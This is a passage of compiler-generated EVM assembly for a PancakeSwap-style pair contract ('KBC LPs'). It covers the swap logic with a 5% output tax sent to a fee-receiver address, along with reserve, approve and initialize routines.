/* \"src/Pair.sol\":12454:12467  to != _token1 */\n      and\n      eq\n      iszero\n        /* \"src/Pair.sol\":12437:12467  to != _token0 && to != _token1 */\n    tag_138:\n        /* \"src/Pair.sol\":12429:12491  require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\") */\n      tag_139\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x13\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x68, 0x50616e63616b653a20494e56414c49445f544f)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_139:\n        /* \"src/Pair.sol\":12509:12523  amount0Out > 0 */\n      dup13\n      iszero\n        /* \"src/Pair.sol\":12505:12566  if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n      jumpi\n        /* \"src/Pair.sol\":12525:12566  _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n        /* \"src/Pair.sol\":12539:12546  _token0 */\n      dup3\n        /* \"src/Pair.sol\":12548:12550  to */\n      dup13\n        /* \"src/Pair.sol\":12552:12565  taxamount0Out */\n      dup7\n        /* \"src/Pair.sol\":12525:12538  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":12525:12566  _safeTransfer(_token0, to, taxamount0Out) */\n      jump\t// in\n    tag_141:\n        /* \"src/Pair.sol\":12618:12632  amount1Out > 0 */\n      dup12\n      iszero\n        /* \"src/Pair.sol\":12614:12675  if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n      jumpi\n        /* \"src/Pair.sol\":12634:12675  _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n        /* \"src/Pair.sol\":12648:12655  _token1 */\n      dup2\n        /* \"src/Pair.sol\":12657:12659  to */\n      dup13\n        /* \"src/Pair.sol\":12661:12674  taxamount1Out */\n      dup6\n        /* \"src/Pair.sol\":12634:12647  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":12634:12675  _safeTransfer(_token1, to, taxamount1Out) */\n      jump\t// in\n    tag_144:\n        /* \"src/Pair.sol\":12727:12742  data.length > 0 */\n      dup9\n      iszero\n        /* \"src/Pair.sol\":12723:12960  if (data.length > 0)... */\n      tag_145\n      jumpi\n        /* \"src/Pair.sol\":12768:12770  to */\n      dup11\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12760:12783  ICallee(to).pancakeCall */\n      and\n      0x84800812\n        /* \"src/Pair.sol\":12805:12815  msg.sender */\n      caller\n        /* \"src/Pair.sol\":12837:12850  taxamount0Out */\n      dup7\n        /* \"src/Pair.sol\":12887:12900  taxamount1Out */\n      dup7\n        /* \"src/Pair.sol\":12938:12942  data */\n      dup15\n      dup15\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup7\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup6\n      dup2\n      mstore\n      0x20\n      add\n      dup5\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup5\n      dup3\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n        /* \"--CODEGEN--\":30:33   */\n      dup1\n        /* \"--CODEGEN--\":22:28   */\n      dup3\n        /* \"--CODEGEN--\":14:20   */\n      dup5\n        /* \"--CODEGEN--\":1:34   */\n      calldatacopy\n        /* \"--CODEGEN--\":99:100   */\n      0x00\n        /* \"--CODEGEN--\":93:96   */\n      dup2\n        /* \"--CODEGEN--\":85:91   */\n      dup5\n        /* \"--CODEGEN--\":81:97   */\n      add\n        /* \"--CODEGEN--\":74:101   */\n      mstore\n        /* \"--CODEGEN--\":137:141   */\n      0x1f\n        /* \"--CODEGEN--\":133:142   */\n      not\n        /* \"--CODEGEN--\":126:130   */\n      0x1f\n        /* \"--CODEGEN--\":121:124   */\n      dup3\n        /* \"--CODEGEN--\":117:131   */\n      add\n        /* \"--CODEGEN--\":113:143   */\n      and\n        /* \"--CODEGEN--\":106:143   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":169:172   */\n      dup1\n        /* \"--CODEGEN--\":161:167   */\n      dup4\n        /* \"--CODEGEN--\":157:173   */\n      add\n        /* \"--CODEGEN--\":147:173   */\n      swap3\n      pop\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_146\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_146:\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_147\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_147:\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":12723:12960  if (data.length > 0)... */\n    tag_145:\n        /* \"src/Pair.sol\":13006:13009  100 */\n      0x64\n        /* \"src/Pair.sol\":13001:13002  5 */\n      0x05\n        /* \"src/Pair.sol\":12988:13002  amount0Out * 5 */\n      dup15\n      dup2\n      mul\n        /* \"src/Pair.sol\":12987:13009  (amount0Out * 5) / 100 */\n      dup3\n      swap1\n      div\n      swap2\n        /* \"src/Pair.sol\":13036:13050  amount1Out * 5 */\n      swap1\n      dup15\n      mul\n        /* \"src/Pair.sol\":13035:13057  (amount1Out * 5) / 100 */\n      div\n        /* \"src/Pair.sol\":13076:13090  amount0Out > 0 */\n      dup15\n      iszero\n        /* \"src/Pair.sol\":13072:13132  if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      jumpi\n        /* \"src/Pair.sol\":13115:13125  FeeResiver */\n      sload(0x06)\n        /* \"src/Pair.sol\":13092:13132  _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      swap1\n        /* \"src/Pair.sol\":13106:13113  _token0 */\n      dup6\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13115:13125  FeeResiver */\n      and\n        /* \"src/Pair.sol\":13127:13131  tax0 */\n      dup5\n        /* \"src/Pair.sol\":13092:13105  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":13092:13132  _safeTransfer(_token0, FeeResiver, tax0) */\n      jump\t// in\n    tag_151:\n        /* \"src/Pair.sol\":13184:13198  amount1Out > 0 */\n      dup14\n      iszero\n        /* \"src/Pair.sol\":13180:13240  if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      jumpi\n        /* \"src/Pair.sol\":13223:13233  FeeResiver */\n      sload(0x06)\n        /* \"src/Pair.sol\":13200:13240  _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      swap1\n        /* \"src/Pair.sol\":13214:13221  _token1 */\n      dup5\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13223:13233  FeeResiver */\n      and\n        /* \"src/Pair.sol\":13235:13239  tax1 */\n      dup4\n        /* \"src/Pair.sol\":13200:13213  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":13200:13240  _safeTransfer(_token1, FeeResiver, tax1) */\n      jump\t// in\n    tag_153:\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":13333:13337  this */\n      address\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13299:13324  IERC20(_token0).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":13299:13324  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_154\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_154:\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_155\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_155:\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_156\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_156:\n      pop\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":13398:13402  this */\n      address\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap10\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13364:13389  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":13364:13389  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_157\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_157:\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_158\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_158:\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_159\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_159:\n      pop\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap7\n      pop\n        /* \"src/Pair.sol\":13424:13438  uint amount0In */\n      0x00\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13452:13474  _reserve0 - amount0Out */\n      dup6\n      and\n      dup11\n      swap1\n      sub\n        /* \"src/Pair.sol\":13441:13474  balance0 > _reserve0 - amount0Out */\n      dup4\n      gt\n        /* \"src/Pair.sol\":13441:13540  balance0 > _reserve0 - amount0Out... */\n      tag_160\n      jumpi\n        /* \"src/Pair.sol\":13539:13540  0 */\n      0x00\n        /* \"src/Pair.sol\":13441:13540  balance0 > _reserve0 - amount0Out... */\n      jump(tag_161)\n    tag_160:\n        /* \"src/Pair.sol\":13513:13523  amount0Out */\n      dup10\n        /* \"src/Pair.sol\":13501:13510  _reserve0 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13501:13523  _reserve0 - amount0Out */\n      and\n      sub\n        /* \"src/Pair.sol\":13489:13497  balance0 */\n      dup4\n        /* \"src/Pair.sol\":13489:13524  balance0 - (_reserve0 - amount0Out) */\n      sub\n        /* \"src/Pair.sol\":13441:13540  balance0 > _reserve0 - amount0Out... */\n    tag_161:\n        /* \"src/Pair.sol\":13424:13540  uint amount0In = balance0 > _reserve0 - amount0Out... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":13550:13564  uint amount1In */\n      0x00\n        /* \"src/Pair.sol\":13590:13600  amount1Out */\n      dup10\n        /* \"src/Pair.sol\":13578:13587  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13578:13600  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/Pair.sol\":13567:13575  balance1 */\n      dup4\n        /* \"src/Pair.sol\":13567:13600  balance1 > _reserve1 - amount1Out */\n      gt\n        /* \"src/Pair.sol\":13567:13666  balance1 > _reserve1 - amount1Out... */\n      tag_162\n      jumpi\n        /* \"src/Pair.sol\":13665:13666  0 */\n      0x00\n        /* \"src/Pair.sol\":13567:13666  balance1 > _reserve1 - amount1Out... */\n      jump(tag_163)\n    tag_162:\n        /* \"src/Pair.sol\":13639:13649  amount1Out */\n      dup10\n        /* \"src/Pair.sol\":13627:13636  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13627:13649  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/Pair.sol\":13615:13623  balance1 */\n      dup4\n        /* \"src/Pair.sol\":13615:13650  balance1 - (_reserve1 - amount1Out) */\n      sub\n        /* \"src/Pair.sol\":13567:13666  balance1 > _reserve1 - amount1Out... */\n    tag_163:\n        /* \"src/Pair.sol\":13550:13666  uint amount1In = balance1 > _reserve1 - amount1Out... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":13709:13710  0 */\n      0x00\n        /* \"src/Pair.sol\":13697:13706  amount0In */\n      dup3\n        /* \"src/Pair.sol\":13697:13710  amount0In > 0 */\n      gt\n        /* \"src/Pair.sol\":13697:13727  amount0In > 0 || amount1In > 0 */\n      dup1\n      tag_164\n      jumpi\n      pop\n        /* \"src/Pair.sol\":13726:13727  0 */\n      0x00\n        /* \"src/Pair.sol\":13714:13723  amount1In */\n      dup2\n        /* \"src/Pair.sol\":13714:13727  amount1In > 0 */\n      gt\n        /* \"src/Pair.sol\":13697:13727  amount0In > 0 || amount1In > 0 */\n    tag_164:\n        /* \"src/Pair.sol\":13676:13787  require(... */\n      tag_165\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_165:\n        /* \"src/Pair.sol\":13887:13908  uint balance0Adjusted */\n      0x00\n        /* \"src/Pair.sol\":13929:13971  balance0.mul(10000).sub(amount0In.mul(25)) */\n      tag_166\n        /* \"src/Pair.sol\":13953:13970  amount0In.mul(25) */\n      tag_167\n        /* \"src/Pair.sol\":13953:13962  amount0In */\n      dup5\n        /* \"src/Pair.sol\":13967:13969  25 */\n      0x19\n        /* \"src/Pair.sol\":13953:13970  amount0In.mul(25) */\n      0xffffffff\n        /* \"src/Pair.sol\":13953:13966  amount0In.mul */\n      tag_168\n        /* \"src/Pair.sol\":13953:13970  amount0In.mul(25) */\n      and\n      jump\t// in\n    tag_167:\n        /* \"src/Pair.sol\":13929:13948  balance0.mul(10000) */\n      tag_169\n        /* \"src/Pair.sol\":13929:13937  balance0 */\n      dup8\n        /* \"src/Pair.sol\":13942:13947  10000 */\n      0x2710\n        /* \"src/Pair.sol\":13929:13948  balance0.mul(10000) */\n      0xffffffff\n        /* \"src/Pair.sol\":13929:13941  balance0.mul */\n      tag_168\n        /* \"src/Pair.sol\":13929:13948  balance0.mul(10000) */\n      and\n      jump\t// in\n    tag_169:\n        /* \"src/Pair.sol\":13929:13952  balance0.mul(10000).sub */\n      swap1\n        /* \"src/Pair.sol\":13929:13971  balance0.mul(10000).sub(amount0In.mul(25)) */\n      0xffffffff\n        /* \"src/Pair.sol\":13929:13952  balance0.mul(10000).sub */\n      tag_170\n        /* \"src/Pair.sol\":13929:13971  balance0.mul(10000).sub(amount0In.mul(25)) */\n      and\n      jump\t// in\n    tag_166:\n        /* \"src/Pair.sol\":13887:13985  uint balance0Adjusted = (... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":13999:14020  uint balance1Adjusted */\n      0x00\n        /* \"src/Pair.sol\":14041:14083  balance1.mul(10000).sub(amount1In.mul(25)) */\n      tag_171\n        /* \"src/Pair.sol\":14065:14082  amount1In.mul(25) */\n      tag_167\n        /* \"src/Pair.sol\":14065:14074  amount1In */\n      dup5\n        /* \"src/Pair.sol\":14079:14081  25 */\n      0x19\n        /* \"src/Pair.sol\":14065:14082  amount1In.mul(25) */\n      0xffffffff\n        /* \"src/Pair.sol\":14065:14078  amount1In.mul */\n      tag_168\n        /* \"src/Pair.sol\":14065:14082  amount1In.mul(25) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":14041:14083  balance1.mul(10000).sub(amount1In.mul(25)) */\n    tag_171:\n        /* \"src/Pair.sol\":13999:14097  uint balance1Adjusted = (... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":14198:14244  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      tag_174\n        /* \"src/Pair.sol\":14233:14243  10000 ** 2 */\n      0x05f5e100\n        /* \"src/Pair.sol\":14198:14228  uint(_reserve0).mul(_reserve1) */\n      tag_175\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":14198:14213  uint(_reserve0) */\n      dup12\n      dup2\n      and\n      swap1\n        /* \"src/Pair.sol\":14198:14228  uint(_reserve0).mul(_reserve1) */\n      dup12\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":14198:14217  uint(_reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":14198:14228  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n    tag_175:\n        /* \"src/Pair.sol\":14198:14232  uint(_reserve0).mul(_reserve1).mul */\n      swap1\n        /* \"src/Pair.sol\":14198:14244  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      0xffffffff\n        /* \"src/Pair.sol\":14198:14232  uint(_reserve0).mul(_reserve1).mul */\n      tag_168\n        /* \"src/Pair.sol\":14198:14244  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      and\n      jump\t// in\n    tag_174:\n        /* \"src/Pair.sol\":14136:14174  balance0Adjusted.mul(balance1Adjusted) */\n      tag_176\n        /* \"src/Pair.sol\":14136:14152  balance0Adjusted */\n      dup4\n        /* \"src/Pair.sol\":14157:14173  balance1Adjusted */\n      dup4\n        /* \"src/Pair.sol\":14136:14174  balance0Adjusted.mul(balance1Adjusted) */\n      0xffffffff\n        /* \"src/Pair.sol\":14136:14156  balance0Adjusted.mul */\n      tag_168\n        /* \"src/Pair.sol\":14136:14174  balance0Adjusted.mul(balance1Adjusted) */\n      and\n      jump\t// in\n    tag_176:\n        /* \"src/Pair.sol\":14136:14244  balance0Adjusted.mul(balance1Adjusted) >=... */\n      lt\n      iszero\n        /* \"src/Pair.sol\":14111:14288  require(... */\n      tag_177\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0a\n      0x24\n      dup3\n      add\n      mstore\n      shl(0xb0, 0x50616e63616b653a204b)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_177:\n        /* \"src/Pair.sol\":1244:1245  _ */\n      pop\n      pop\n        /* \"src/Pair.sol\":14309:14358  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_178\n        /* \"src/Pair.sol\":14317:14325  balance0 */\n      dup5\n        /* \"src/Pair.sol\":14327:14335  balance1 */\n      dup5\n        /* \"src/Pair.sol\":14337:14346  _reserve0 */\n      dup9\n        /* \"src/Pair.sol\":14348:14357  _reserve1 */\n      dup9\n        /* \"src/Pair.sol\":14309:14316  _update */\n      tag_179\n        /* \"src/Pair.sol\":14309:14358  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_178:\n        /* \"src/Pair.sol\":14373:14439  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup4\n      swap1\n      mstore\n      dup1\n      dup3\n      add\n      dup14\n      swap1\n      mstore\n      0x60\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup12\n      and\n      swap2\n        /* \"src/Pair.sol\":14378:14388  msg.sender */\n      caller\n      swap2\n        /* \"src/Pair.sol\":14373:14439  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822\n      swap2\n      dup2\n      swap1\n      sub\n      0x80\n      add\n      swap1\n      log3\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      jump\t// out\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_48:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":1280:1581  function getReserves()... */\n    tag_54:\n        /* \"src/Pair.sol\":1486:1494  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":1516:1524  reserve1 */\n      dup4\n      div\n      swap1\n      swap2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/Pair.sol\":1556:1574  blockTimestampLast */\n      swap1\n      div\n      0xffffffff\n      and\n      swap1\n        /* \"src/Pair.sol\":1280:1581  function getReserves()... */\n      jump\t// out\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"src/ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_182\n        /* \"src/ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"src/ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"src/ERC20.sol\":2893:2901  _approve */\n      tag_183\n        /* \"src/ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_182:\n      pop\n        /* \"src/ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_181:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/Pair.sol\":587:608  address public token0 */\n    tag_59:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x08))\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n    tag_62:\n        /* \"src/Pair.sol\":2617:2624  factory */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n        /* \"src/Pair.sol\":2603:2613  msg.sender */\n      caller\n        /* \"src/Pair.sol\":2603:2624  msg.sender == factory */\n      eq\n        /* \"src/Pair.sol\":2595:2647  require(msg.sender == factory, \"Pancake: FORBIDDEN\") */\n      tag_185\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x12\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x71, 0x2830b731b0b5b29d102327a92124a22222a7)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_185:\n        /* \"src/Pair.sol\":2677:2683  token0 */\n      0x08\n        /* \"src/Pair.sol\":2677:2693  token0 = _token0 */\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      swap2\n      dup3\n      and\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/Pair.sol\":2703:2709  token1 */\n      0x09\n        /* \"src/Pair.sol\":2703:2719  token1 = _token1 */\n      dup1\n      sload\n      swap4\n      swap1\n      swap5\n      and\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/Pair.sol\":2729:2735  taxfee */\n      0x0a\n        /* \"src/Pair.sol\":2729:2745  taxfee = _taxfee */\n      sstore\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n      jump\t// out\n        /* \"src/ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_64:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_67:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      